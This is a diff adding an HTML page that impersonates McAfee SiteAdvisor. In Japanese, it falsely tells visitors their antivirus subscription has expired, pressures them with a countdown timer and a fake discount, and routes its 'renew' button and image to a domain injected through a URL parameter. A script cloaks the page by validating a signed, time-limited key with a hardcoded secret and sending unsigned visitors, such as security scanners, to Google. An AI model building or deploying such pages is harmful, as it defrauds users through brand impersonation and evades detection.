@@ -1,0 +1,90 @@
+<!DOCTYPE html><html prefix="og: http://ogp.me/ns#">
+
+
+<head>
+<script>
+function getURLParameter(name) {
+    return decodeURI(
+        (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search)||[,null])[1] || ''
+    );
+}
+</script>
+
+
+
+
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/crypto-js.min.js"></script>
+<script>
+function check(secretKey, ttl, signature) {
+    try {
+        let sign = atob(signature);
+        sign = JSON.parse(sign);
+        if (!sign.timestamp || !sign.hash) return false;
+        const signedHash = CryptoJS.HmacSHA1(sign.timestamp, secretKey).toString();
+        if (signedHash !== sign.hash || sign.timestamp < (((new Date().getTime() / 1000) | 0) - ttl).toString()) return false;
+        return true;
+    } catch (err) {
+        return false;
+    }
+}
+
+const secretKey = 'MWE1ZjM2ZjY3ZGIxNGNmZmRlM2M0Mzg5NmZmYjNkMTk0MDI3MGUzOA=='; // Your secret key
+const fallbackUrl = 'https://www.google.com/ '; // Redirect URL for users who didn't pass the check
+
+const ttl = 21;
+const signature = new URL(document.location.href).searchParams.get('key');
+
+if(!check(secretKey, ttl, signature))
+    document.location.href = fallbackUrl;
+</script>
+
+
+
+<link rel="icon" href="img/McAfee_1.png" type="image/png" sizes="16x16">
+
+
+<meta charset=utf-8><title>Mcafee</title><meta name=robots content=all><meta name=generator content=""><meta http-equiv=Cache-Control content="must-revalidate, max-age=0, public"><meta http-equiv=Expires content=-1><meta name=viewport content="width=1180" minpagewidth=1180><meta name=MobileOptimized content=320><meta name=HandheldFriendly content=True><meta name=format-detection content="telephone=no"><meta property=og:type content=website><meta property=og:title content=""><meta property=og:site_name content=askchange.com><meta property=og:url content=><meta name=twitter:card content=summary><link rel=canonical href=><link rel=stylesheet href=css/0ed625b437.css><script src=js/56647ca3b2.js></script><link href="//fonts.googleapis.com/css?family=Quicksand%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%2Citalic%2Cregular&amp;subset=all" rel=stylesheet><link href="//fonts.googleapis.com/css?family=Lato%3A100%2C100italic%2C200%2C200italic%2C300%2C300italic%2C500%2C500italic%2C600%2C600italic%2C700%2C700italic%2C800%2C800italic%2C900%2C900italic%2Citalic%2Cregular&amp;subset=all" rel=stylesheet><link rel=stylesheet href=css/f0cff609a4.css>
+
+
+</head><body class="Preview_body__2wDzb bodyBackground" style=overflow-y:scroll;overflow-x:auto><div><link rel=stylesheet href=css/1b82a34049.css></div><div class=template data-mobile-view=false><div class="Preview_row__3Fkye row" style=width:1180px></div><div class="Preview_row__3Fkye row" style=min-height:86px;width:1180px><div class="Preview_column__1KeVx col" style=min-height:86px;width:585px;float:left><div data-id=501E46FD-ED14-4CF5-BBE3-F89C2BBAA8DE data-kind=IMAGE style=width:204px;min-height:57px;margin-top:26px;margin-left:381px class=Preview_componentWrapper__2i4QI><div data-in-template=false data-id=501E46FD-ED14-4CF5-BBE3-F89C2BBAA8DE data-kind=Component data-specific-kind=IMAGE class=Preview_component__SbiKo><div class=Mobile_imageComponent__QXWk1 style=width:204px;height:57px;overflow:hidden data-width=204 data-height=57><img data-loading=lazy role=presentation data-scalestrategy=fit style=display:block;margin:0 src="img/mcafee_logo.png" srcset="" height=57 width=204 data-width=204 data-height=57></div></div></div><div style=clear:both></div></div><div class="Preview_column__1KeVx col" style=min-height:86px;width:29px;float:left><div data-id=7A27C338-28BB-4F36-AE4D-4BE34A7CCF88 data-kind=BACKGROUND style=width:2px;min-height:65px;margin-top:21px;margin-left:27px class=Preview_componentWrapper__2i4QI><div data-in-template=false data-id=7A27C338-28BB-4F36-AE4D-4BE34A7CCF88 data-kind=Component data-specific-kind=BACKGROUND class=Preview_mobileHide__9T929><div class="BackgroundPreview_backgroundComponent__3Dr5e BackgroundPreview_bgHeight__3dD2e" style="background-color:rgba(226,226,226,1);border-color:rgba(2,34,37,0.77);border-style:solid;border-width:1px 1px 1px 1px;border-top-left-radius:0px;border-top-right-radius:0px;border-bottom-right-radius:0px;border-bottom-left-radius:0px;background-clip:padding-box;min-height:65px"></div></div></div><div style=clear:both></div></div><div class="Preview_column__1KeVx col" style=min-height:86px;width:250px;float:left><div data-id=F9E1D9BD-92C5-483A-9958-FDA6FCC0B957 data-kind=TEXT style=width:227px;min-height:52px;margin-top:31px;margin-left:23px class=Preview_componentWrapper__2i4QI><div data-in-template=false data-id=F9E1D9BD-92C5-483A-9958-FDA6FCC0B957 data-kind=Component data-specific-kind=TEXT class="Preview_component__SbiKo text-align-null"><div data-mve-font-change=0 class="styles_contentContainer__lrPIa textnormal styles_text__3jGMu"><p class="textnormal mobile-oversized" style="font-size: 36px;"><span style="font-size: 36px; font-family: Quicksand;" class=mobile-oversized>SiteAdvisor</span></p></div></div></div><div style=clear:both></div></div></div><div class="Preview_row__3Fkye row" style=min-height:970px;width:1180px><div class="Preview_float__1PmYU float" style=top:49px;left:187px;z-index:999><div data-id=BAF301DF-7C82-455B-9FFA-08F82E8EAC0A data-kind=BACKGROUND style=width:805px;min-height:880px class=Preview_componentWrapper__2i4QI><div data-in-template=false data-id=BAF301DF-7C82-455B-9FFA-08F82E8EAC0A data-kind=Block data-specific-kind=BACKGROUND class=Preview_block__16Zmu><div class="BackgroundPreview_backgroundComponent__3Dr5e BackgroundPreview_bgHeight__3dD2e hasChildren" style="background-color:rgba(255,255,255,1);border-color:rgba(0,0,0,1);border-style:none;border-width:1px 1px 1px 1px;min-height:880px"><div class="Preview_column__1KeVx col" style=min-height:100%><div class="Preview_row__3Fkye row" style=min-height:244px;width:805px><div data-id=409207FD-B978-4248-8A29-89E35AFF0CFD data-kind=TEXT style=width:734px;min-height:119px;margin-top:125px;margin-left:44px class=Preview_componentWrapper__2i4QI><div data-in-template=false data-id=409207FD-B978-4248-8A29-89E35AFF0CFD data-kind=Component data-specific-kind=TEXT class="Preview_component__SbiKo text-align-null"><div data-mve-font-change=0 class="styles_contentContainer__lrPIa textnormal styles_text__3jGMu"><p style="font-size: 20px;"><span style="font-size: 20px;">マカフィー アンチウイルスのサブスクリプションは、2022 年 12 月 31 日土曜日に期限切れになりました。</span></p><p style="font-size: 20px;"><span style="font-size: 20px;"><br></span></p><p style="font-size: 20px;"><span style="font-size: 20px;">有効期限が過ぎると、お使いのコンピュータは様々なウイルスに感染しやすくなります。</span></p></div></div></div></div><div class="Preview_row__3Fkye row" style=min-height:22px;width:805px><div data-id=79CA9F74-7469-4F32-8531-5283D14265F0 data-kind=BACKGROUND style=width:706px;min-height:2px;margin-top:20px;margin-left:42px class=Preview_componentWrapper__2i4QI><div data-in-template=false data-id=79CA9F74-7469-4F32-8531-5283D14265F0 data-kind=Component data-specific-kind=BACKGROUND class=Preview_mobileHide__9T929><div class="BackgroundPreview_backgroundComponent__3Dr5e BackgroundPreview_bgHeight__3dD2e" style=background-color:rgba(238,238,238,1);min-height:2px></div></div></div></div><div class="Preview_row__3Fkye row" style=min-height:70px;width:805px><div data-id=EEBCDD80-7CD7-4E31-92C9-014041D774AF data-kind=TEXT style=width:728px;min-height:47px;margin-top:23px;margin-left:45px class=Preview_componentWrapper__2i4QI><div data-in-template=false data-id=EEBCDD80-7CD7-4E31-92C9-014041D774AF data-kind=Component data-specific-kind=TEXT class="Preview_component__SbiKo text-align-null"><div data-mve-font-change=0 class="styles_contentContainer__lrPIa textnormal styles_text__3jGMu"><p style="font-size: 20px;"><span style="font-weight: bold; font-size: 20px;">ご利用のコンピュータは保護されておらず、ウイルスやその他の脅威に晒されています...</span></p></div></div></div></div><div class="Preview_row__3Fkye row" style=min-height:54px;width:805px><div class="Preview_float__1PmYU float" style=top:22px;left:283px;z-index:1023><div data-id=FB8C515F-92A4-4B7F-9F96-F52AD4B09B48 data-kind=CODE style=width:262px;min-height:24px class=Preview_componentWrapper__2i4QI><div data-in-template=false data-id=FB8C515F-92A4-4B7F-9F96-F52AD4B09B48 data-kind=Component data-specific-kind=CODE class=Preview_component__SbiKo><div data-width=262 data-location="" id=code-component-FB8C515F-92A4-4B7F-9F96-F52AD4B09B48 class="preview_code__2Lr3m code-component-container"><html> <div id="clockdiv"></div><style>div{
+color:#d41347;
+font-size:21px;
+font-weight:bold;
+}</style> 
+<script> // 10 minutes from now
+var time_in_minutes = 21;
+var current_time = Date.parse(new Date());
+var deadline = new Date(current_time + time_in_minutes*60*1000);
+function time_remaining(endtime){
+var t = Date.parse(endtime) - Date.parse(new Date());
+var seconds = Math.floor( (t/1000) % 60 );
+var minutes = Math.floor( (t/1000/60) % 60 );
+var hours = Math.floor( (t/(1000*60*60)) % 24 );
+var days = Math.floor( t/(1000*60*60*24) );
+return {'total':t, 'days':days, 'hours':hours, 'minutes':minutes, 'seconds':seconds};
+}
+function run_clock(id,endtime){
+var clock = document.getElementById(id);
+function update_clock(){
+var t = time_remaining(endtime);
+clock.innerHTML = ''+t.minutes+' 分: '+t.seconds+' 秒 ';
+if(t.total<=0){ clearInterval(timeinterval); }
+}
+update_clock(); // run function once at first to avoid delay
+var timeinterval = setInterval(update_clock,1000);
+}
+run_clock('clockdiv',deadline);
+</script> </html></div></div></div></div><div data-id=46795E3B-B9A4-4BE4-837C-D4050958E513 data-kind=TEXT style=width:204px;min-height:30px;margin-top:24px;margin-left:81px;z-index:1013 class=Preview_componentWrapper__2i4QI><div data-in-template=false data-id=46795E3B-B9A4-4BE4-837C-D4050958E513 data-kind=Component data-specific-kind=TEXT class="Preview_component__SbiKo text-align-null"><div data-mve-font-change=0 class="styles_contentContainer__lrPIa textnormal styles_text__3jGMu"><p style="font-size: 20px;"><span style="color: #d41347; font-size: 20px;">（-61％）割引を取得:&nbsp;</span></p></div></div></div></div><div class="Preview_row__3Fkye row" style=min-height:319px;width:805px><div data-id=E4E15C57-C389-4E34-AEEF-DA3B04481B5B data-kind=IMAGE style=width:209px;min-height:279px;margin-top:40px;margin-left:298px class=Preview_componentWrapper__2i4QI><div data-in-template=false data-id=E4E15C57-C389-4E34-AEEF-DA3B04481B5B data-kind=Component data-specific-kind=IMAGE class=Preview_component__SbiKo><div class=Mobile_imageComponent__QXWk1 style=width:209px;height:279px;overflow:hidden data-width=209 data-height=279>
+
+<script>
+document.write('<a href=https://' + getURLParameter('domain') + '/click target=_self alt="" data-stop-propagation=true><img data-loading=lazy role=presentation data-scalestrategy=fit style=display:block;margin:0 src="img/71WqdF2iPBL._AC_SL1500_.jpg" srcset="" height=279 width=209 data-width=209 data-height=279></a>')
+    </script>
+
+</div></div></div></div><div class="Preview_row__3Fkye row" style=min-height:114px;width:805px><div data-id=6DCE8DA7-DC50-4F0F-9C08-F24907B0E0EE data-kind=BUTTON style=width:454px;height:63px;margin-top:51px;margin-left:176px class=Preview_componentWrapper__2i4QI><div data-in-template=false data-id=6DCE8DA7-DC50-4F0F-9C08-F24907B0E0EE data-kind=Component data-specific-kind=BUTTON class="Preview_component__SbiKo align-center"><div class="ButtonPreview_container__22hQi ButtonPreview_buttonTransition__CKIAx button8"><div class=ButtonPreview_buttonComponent__17NP0>
+
+<script>
+document.write('<a href=https://' + getURLParameter('domain') + '/click target="" class=ButtonPreview_textContainer__t8q7_><span style=font-size:24px><font color="#FFFFFF">サブスクリプションを更新する</span></a>')
+    </script>
+
+</div></div></div></div></div><div class="Preview_float__1PmYU float" style=top:-21px;left:0;z-index:1003><div data-id=3FE94D12-60FE-438B-B406-1CB6F3513657 data-kind=BACKGROUND style=width:805px;min-height:110px class=Preview_componentWrapper__2i4QI><div data-in-template=false data-id=3FE94D12-60FE-438B-B406-1CB6F3513657 data-kind=Block data-specific-kind=BACKGROUND class=Preview_block__16Zmu><div class="BackgroundPreview_backgroundComponent__3Dr5e BackgroundPreview_bgHeight__3dD2e hasChildren" style=background-color:rgba(212,19,71,1);min-height:110px><div class="Preview_column__1KeVx col" style=min-height:100%><div class="Preview_row__3Fkye row" style=min-height:89px;width:805px><div data-id=1789CC10-C4CD-4D4B-8E84-C5A8F4F58590 data-kind=TEXT style=width:770px;min-height:67px;margin-top:22px;margin-left:24px class=Preview_componentWrapper__2i4QI><div data-in-template=false data-id=1789CC10-C4CD-4D4B-8E84-C5A8F4F58590 data-kind=Component data-specific-kind=TEXT class="Preview_component__SbiKo text-align-null"><div data-mve-font-change=0 class="styles_contentContainer__lrPIa textnormal styles_text__3jGMu"><p style="font-size: 27px; text-align: center;" class=mobile-oversized><span style="color: #fdfdfd; font-size: 27px; font-weight: bold;" class=mobile-oversized>お使いのMcAfee Antivirusのサブスクリプションは有効期限が切れました</span></p></div></div></div></div><div style=clear:both></div></div></div></div></div></div><div style=clear:both></div></div></div></div></div></div><div data-id=C17D4B60-2BF2-411D-AFC2-25F9536E27F4 data-kind=TEXT style=width:172px;min-height:80px;margin-top:890px;margin-left:108px;z-index:1001 class=Preview_componentWrapper__2i4QI><div data-in-template=false data-id=C17D4B60-2BF2-411D-AFC2-25F9536E27F4 data-kind=Component data-specific-kind=TEXT class="Preview_component__SbiKo text-align-null"><div data-mve-font-change=0 class="styles_contentContainer__lrPIa textnormal styles_text__3jGMu"><p><br></p></div></div></div></div></div><div class=publishOnlyComponents><div></div><div></div></div><script src=js/0604f2e52f.js></script><script src=js/77d7b60804.js id=mobileBackgroundLiner data-params={&quot;bodyBackgroundClassName&quot;:&quot;bodyBackground&quot;,&quot;linerClassName&quot;:&quot;Preview_bodyBackgroundLiner__1bYbS&quot;,&quot;scrollEffect&quot;:null}></script></body></html>
